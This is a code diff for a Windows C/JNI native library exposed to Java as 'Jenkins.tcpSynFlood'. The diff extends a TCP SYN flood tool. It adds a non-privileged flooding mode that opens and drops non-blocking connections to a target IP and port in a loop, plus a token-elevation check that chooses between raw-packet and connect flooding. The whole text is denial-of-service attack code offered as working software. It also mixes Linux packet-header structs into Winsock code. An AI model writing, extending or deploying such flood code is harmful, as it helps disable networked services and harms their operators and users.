@@ -120,8 +120,9 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
     }
 
     DWORD start_time = GetTickCount();
-    long packets_sent = 0;
-    long bytes_sent = 0;
+    DWORD bytes_sent = 0;
+    int packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
+    int packets_sent = 0;
 
     while (!(*(data->stop_attack))) {
         // Randomize source IP and ports
@@ -138,7 +139,7 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
             printf("sendto() failed. Error number: %d\n", WSAGetLastError());
         } else {
             packets_sent++;
-            bytes_sent += iph->tot_len;
+            bytes_sent += packet_size;
         }
 
         // Rate limiting
@@ -147,8 +148,10 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
             if (elapsed_time < 1000) {
                 Sleep(1000 - elapsed_time);
             }
+            printf("Sent %d packets, %d bytes\n", packets_sent, bytes_sent);
             start_time = GetTickCount();
             bytes_sent = 0;
+            packets_sent = 0;
         }
     }
 
@@ -156,7 +159,50 @@ DWORD WINAPI send_syn_packets(LPVOID arg) {
     return 0;
 }
 
-JNIEXPORT void JNICALL Java_com_yourpackage_Jenkins_tcpSynFlood
+DWORD WINAPI send_syn_packets_non_privileged(LPVOID arg) {
+    struct thread_data *data = (struct thread_data *)arg;
+    DWORD start_time = GetTickCount();
+    DWORD bytes_sent = 0;
+    int packets_sent = 0;
+
+    while (!(*(data->stop_attack))) {
+        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (s == INVALID_SOCKET) {
+            continue;
+        }
+
+        struct sockaddr_in sin;
+        sin.sin_family = AF_INET;
+        sin.sin_port = htons(data->target_port);
+        sin.sin_addr.s_addr = inet_addr(data->target_ip);
+
+        u_long iMode = 1;
+        ioctlsocket(s, FIONBIO, &iMode);
+
+        connect(s, (struct sockaddr *)&sin, sizeof(sin));
+
+        closesocket(s);
+
+        packets_sent++;
+        bytes_sent += sizeof(struct tcphdr) + sizeof(struct iphdr);
+
+        // Rate limiting
+        if (bytes_sent >= data->bytes_per_second) {
+            DWORD elapsed_time = GetTickCount() - start_time;
+            if (elapsed_time < 1000) {
+                Sleep(1000 - elapsed_time);
+            }
+            printf("Sent %d packets, %d bytes\n", packets_sent, bytes_sent);
+            start_time = GetTickCount();
+            bytes_sent = 0;
+            packets_sent = 0;
+        }
+    }
+
+    return 0;
+}
+
+JNIEXPORT jboolean JNICALL Java_com_yourpackage_Jenkins_tcpSynFlood
   (JNIEnv *env, jobject obj, jstring targetIp, jint targetPort, jint bytesPerSecond) {
     printf("tcpSynFlood method called\n");
     const char *ip = env->GetStringUTFChars(targetIp, 0);
@@ -168,12 +214,30 @@ JNIEXPORT void JNICALL Java_com_yourpackage_Jenkins_tcpSynFlood
     data.stop_attack = &stop_attack;
 
     HANDLE thread;
-    thread = CreateThread(NULL, 0, send_syn_packets, (LPVOID)&data, 0, NULL);
+    BOOL isElevated = FALSE;
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        TOKEN_ELEVATION elevation;
+        DWORD dwSize;
+        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
+            isElevated = elevation.TokenIsElevated;
+        }
+        CloseHandle(hToken);
+    }
+
+    if (isElevated) {
+        thread = CreateThread(NULL, 0, send_syn_packets, (LPVOID)&data, 0, NULL);
+    } else {
+        thread = CreateThread(NULL, 0, send_syn_packets_non_privileged, (LPVOID)&data, 0, NULL);
+    }
+
     if (thread == NULL) {
         printf("Failed to create thread. Error: %d\n", GetLastError());
-    } else {
-        printf("Thread created successfully\n");
+        env->ReleaseStringUTFChars(targetIp, ip);
+        return JNI_FALSE;
     }
+
+    printf("Thread created successfully\n");
 
     // Wait for Java to call stopAttack()
     jclass cls = env->GetObjectClass(obj);
@@ -190,4 +254,5 @@ JNIEXPORT void JNICALL Java_com_yourpackage_Jenkins_tcpSynFlood
 
     env->ReleaseStringUTFChars(targetIp, ip);
     printf("tcpSynFlood method completed\n");
+    return isElevated ? JNI_TRUE : JNI_FALSE;
 }
